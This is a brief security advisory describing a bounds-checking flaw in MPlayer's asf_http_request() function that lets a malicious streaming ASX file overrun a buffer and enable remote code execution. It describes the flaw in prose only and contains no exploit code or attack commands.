A vulnerability has been discovered in MPLayer when handling malformed streaming ASX file headers. The problem occurs due to insufficient bounds checking performed within asf_http_request(). It has been demonstrated that it is possible for a remote attacker to provide a malicious streaming ASX file that will overrun the bounds of a reserved buffer, when a vulnerable version of MPlayer is used to interpret the file. Remote arbitrary code execution has been confirmed possible.
